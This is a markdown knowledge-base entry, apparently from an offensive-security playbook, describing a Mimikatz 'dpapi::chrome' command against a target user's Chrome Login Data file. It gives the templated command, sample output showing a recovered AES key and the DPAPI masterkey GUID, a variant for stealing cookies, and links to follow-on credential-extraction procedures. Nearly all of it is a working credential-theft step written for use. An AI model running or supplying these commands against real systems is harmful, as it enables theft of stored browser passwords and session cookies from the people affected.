---
id: new-uuid-for-guid-command
name: mimikatz-attempt-chrome-extraction-to-get-guid
type: command
executor: command_prompt
data: >-
  mimikatz.exe "dpapi::chrome
  /in:"""C:\Users\$_TARGET_USER\AppData\Local\Google\Chrome\User
  Data\Default\Login Data""" /unprotect" "exit"
output: >-
  C:\Windows\System32\spool\drivers\color>mimikatz.exe "dpapi::chrome
  /in:"""C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login
  Data""" /unprotect" "exit"

    .#####.   mimikatz 2.2.0 (x64) #19041 May 19 2020 00:48:59
   .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
   ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
   ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
   '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
    '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

  mimikatz(commandline) # dpapi::chrome
  /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data"
  /unprotect

  > Encrypted Key found in local state file

  > Encrypted Key seems to be protected by DPAPI
   * using CryptUnprotectData API
   * volatile cache: GUID:{84dcc2cc-82c6-44d4-9404-45fd48b4b650};KeyHash:e49b3e446435a04d0396293e6dcae8df3274e323;Key:available
  > AES Key is: 700c4a9477bf45ac86e53c109511907330a66bad896f3429da96cb70b9afd9f4


  ERROR kuhl_m_dpapi_chrome_decrypt ; CryptUnprotectData (0x00000005)


  mimikatz # exit

  Bye!
created_at: '2023-10-01T00:00:00.000000+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - dpapi
  - chrome
  - guid
verified: true
validated: true
---

# mimikatz-attempt-chrome-extraction-to-get-guid

## Command

```command_prompt
mimikatz.exe "dpapi::chrome /in:"""C:\Users\$_TARGET_USER\AppData\Local\Google\Chrome\User Data\Default\Login Data""" /unprotect" "exit"
```

## Description

This Mimikatz command attempts to decrypt Chrome's Login Data file using DPAPI. It fails without the masterkey but reveals the GUID of the protecting key in the error output, which is essential for locating and decrypting the masterkey.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `$_TARGET_USER` | Target username (e.g., bob) | Yes |
| `/in:"...Login Data"` | Path to Chrome's Login Data file | Yes |
| `/unprotect` | Attempt DPAPI unprotection | Yes (built-in) |

## Examples

### Basic Usage

```command_prompt
mimikatz.exe "dpapi::chrome /in:"""C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data""" /unprotect" "exit"
```

For cookies, replace 'Login Data' with 'Cookies'.

### Advanced Usage

Run interactively: mimikatz.exe then dpapi::chrome /in:"path" /unprotect

## Expected Output

Failure message with GUID exposed:

```
> Encrypted Key seems to be protected by DPAPI
 * using CryptUnprotectData API
 * volatile cache: GUID:{84dcc2cc-82c6-44d4-9404-45fd48b4b650};KeyHash:e49b3e446435a04d0396293e6dcae8df3274e323;Key:available
ERROR kuhl_m_dpapi_chrome_decrypt ; CryptUnprotectData (0x00000005)
```

Extract the GUID from the volatile cache line.

## Related

- [[procedures/Extract-Chrome-Credentials-and-Cookies-Using-User-Password]]
- [[commands/mimikatz-extract-user-masterkey-with-password]]
